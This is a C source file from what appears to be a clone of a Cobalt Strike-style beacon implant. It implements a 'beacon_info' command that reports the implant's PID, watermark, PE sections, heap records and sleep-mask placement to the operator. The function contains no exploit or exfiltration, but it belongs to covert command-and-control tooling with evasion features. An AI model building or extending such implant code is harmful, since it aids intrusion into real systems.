/* ---------------------------------------------------------------------------
 * 4.12 beacon_info (tier-3 item 11): print the beacon's in-memory layout -
 * image base, PE sections, allocated heap records and sleep mask state.
 * Official delivers this as a BOF over /execute/beaconInfo; ours is a
 * native command (COMMAND_BEACON_INFO) feeding the same console verb and
 * REST endpoint. Reply: CALLBACK_OUTPUT text.
 * ------------------------------------------------------------------------- */
#include <windows.h>
#include <stdio.h>
#include "parse.h"
#include "beacon.h"
#include "commands.h"
#include "datastore.h"
#include "track_memory.h"

static void bi_out(void (*callback)(char * buffer, int length, int type), const char * text) {
	callback((char *)text, (int)strlen(text), CALLBACK_OUTPUT);
}

void command_beacon_info(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	BEACON_INFO info;
	char line[512];
	int i;

	(void)buffer;
	(void)length;

	bi_out(callback, "beacon_info:\n");

	/* runtime identity */
	_snprintf(line, sizeof(line) - 1,
		"  pid=%lu arch=%s watermark=%u syscall_method=%d\n",
		GetCurrentProcessId(),
#ifdef _M_X64
		"x64",
#else
		"x86",
#endif
		setting_int(SETTING_WATERMARK),
		syscall_method_get());
	bi_out(callback, line);

	/* the masked-image layout the sleepmask operates on */
	memset(&info, 0, sizeof(info));
	BeaconInformation(&info);

	_snprintf(line, sizeof(line) - 1,
		"  beacon_ptr=%p sections=%p heap_records=%p\n",
		info.beacon_ptr, info.sections, info.heap_records);
	bi_out(callback, line);

	if (info.sections != NULL) {
		bi_out(callback, "  masked image sections (start,end):\n");
		for (i = 0; info.sections[i] != 0 || info.sections[i + 1] != 0; i += 2) {
			_snprintf(line, sizeof(line) - 1, "    %08lX - %08lX\n",
				(unsigned long)(DWORD_PTR)info.sections[i],
				(unsigned long)(DWORD_PTR)info.sections[i + 1]);
			bi_out(callback, line);
			if (i > 64)
				break; /* defensive bound */
		}
	}

	if (info.heap_records != NULL) {
		int n = 0;
		unsigned long long total = 0;
		bi_out(callback, "  heap records (tracked allocations):\n");
		for (i = 0; info.heap_records[i].ptr != NULL; i++) {
			_snprintf(line, sizeof(line) - 1, "    %p %llu bytes\n",
				info.heap_records[i].ptr, (unsigned long long)info.heap_records[i].size);
			bi_out(callback, line);
			total += (unsigned long long)info.heap_records[i].size;
			n++;
			if (n > 512) {
				bi_out(callback, "    ... (truncated at 512 records)\n");
				break;
			}
		}
		_snprintf(line, sizeof(line) - 1, "  heap total: %d records, %llu bytes\n", n, total);
		bi_out(callback, line);
	}

	/* PE section table straight from our image headers */
	if (info.beacon_ptr != NULL) {
		unsigned char * base = (unsigned char *)info.beacon_ptr;
		IMAGE_DOS_HEADER * dos = (IMAGE_DOS_HEADER *)base;
		if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
			IMAGE_NT_HEADERS * nth = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
			if (nth->Signature == IMAGE_NT_SIGNATURE) {
				IMAGE_SECTION_HEADER * sec = IMAGE_FIRST_SECTION(nth);
				int n = nth->FileHeader.NumberOfSections;
				_snprintf(line, sizeof(line) - 1,
					"  image: base=%p SizeOfImage=%lu sections=%d entry=%08lX\n",
					base,
					(unsigned long)nth->OptionalHeader.SizeOfImage,
					n,
					(unsigned long)(DWORD_PTR)(base + nth->OptionalHeader.AddressOfEntryPoint));
				bi_out(callback, line);
				for (i = 0; i < n && i < 16; i++) {
					char name[9];
					memcpy(name, sec[i].Name, 8);
					name[8] = '\0';
					_snprintf(line, sizeof(line) - 1,
						"    %-8s va=%08lX vsz=%08lX rawsz=%08lX\n",
						name,
						(unsigned long)sec[i].VirtualAddress,
						(unsigned long)sec[i].Misc.VirtualSize,
						(unsigned long)sec[i].SizeOfRawData);
					bi_out(callback, line);
				}
			}
		}
	}

	/* sleepmask placement (BOFWIN window) */
	_snprintf(line, sizeof(line) - 1,
		"  sleep_mask_ptr=%p text_size=%lu total_size=%lu\n",
		info.sleep_mask_ptr, info.sleep_mask_text_size, info.sleep_mask_total_size);
	bi_out(callback, line);

	_snprintf(line, sizeof(line) - 1,
		"  settings image=%p data_store_max=%llu\n",
		get_beacon_ptr(),
		(unsigned long long)BeaconDataStoreMaxEntries());
	bi_out(callback, line);
}
